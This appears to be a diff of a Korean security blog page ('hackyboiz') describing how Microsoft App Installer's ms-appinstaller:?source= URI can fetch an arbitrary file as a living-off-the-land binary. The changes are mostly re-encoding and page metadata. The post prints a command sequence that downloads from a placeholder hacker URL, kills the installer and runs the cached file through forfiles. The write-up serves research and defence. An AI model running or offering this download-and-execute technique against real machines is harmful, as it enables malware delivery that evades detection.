@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      169 자
+      297 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      5
        분
     </span>
   
@@ -244,11 +244,11 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Microsoft AppInstaller</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer에서 arbitrary file download를 하여 lolbin(<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)으로 활용할 수 있는 방법이 발견되었습니다.</p>
-<p>웹 서버에서 앱 패키지를 다운로드할 때 과정을 간소화하여 효율적으로 하기 위해 웹 서버에서 직접 앱을 설치할 수 있는 기능을 제공합니다. 웹 페이지에서 앱 패키지를 호스팅 하기 위해서 <code>ms-appinstaller:?source=</code> URI를 사용하여 <code>source=</code>에 명시된 주소에 있는 파일에 대한 앱 다운로드를 진행합니다. 이를 악용하여 해커는 자신의 악성 파일을 source에 작성하여 arbitrary file download을 진행할 수 있고 <code>forfiles</code> 명령어를 통해 앱 패키지 다운로드가 진행된 경로에서 파일을 조건문 등으로 검색하여 실행이 가능합니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer&#xC5D0;&#xC11C; arbitrary file download&#xB97C; &#xD558;&#xC5EC; lolbin(<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC571; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xB54C; &#xACFC;&#xC815;&#xC744; &#xAC04;&#xC18C;&#xD654;&#xD558;&#xC5EC; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC571;&#xC744; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC6F9; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC571; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; <code>ms-appinstaller:?source=</code> URI&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>source=</code>&#xC5D0; &#xBA85;&#xC2DC;&#xB41C; &#xC8FC;&#xC18C;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC571; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xCEE4;&#xB294; &#xC790;&#xC2E0;&#xC758; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC744; source&#xC5D0; &#xC791;&#xC131;&#xD558;&#xC5EC; arbitrary file download&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xACE0; <code>forfiles</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC571; &#xD328;&#xD0A4;&#xC9C0; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xAC00; &#xC9C4;&#xD589;&#xB41C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xC870;&#xAC74;&#xBB38; &#xB4F1;&#xC73C;&#xB85C; &#xAC80;&#xC0C9;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NUL
 
-forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre>
+forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&apos;type @path&apos;) do (%</span>g);&quot; &gt; NUL</code></pre>
 
 <p><img src="/2020/12/03/idioth/2020-12-03/image.png" srcset="/img/loading.gif"></p>
 
@@ -553,6 +553,45 @@ forfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-sy
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
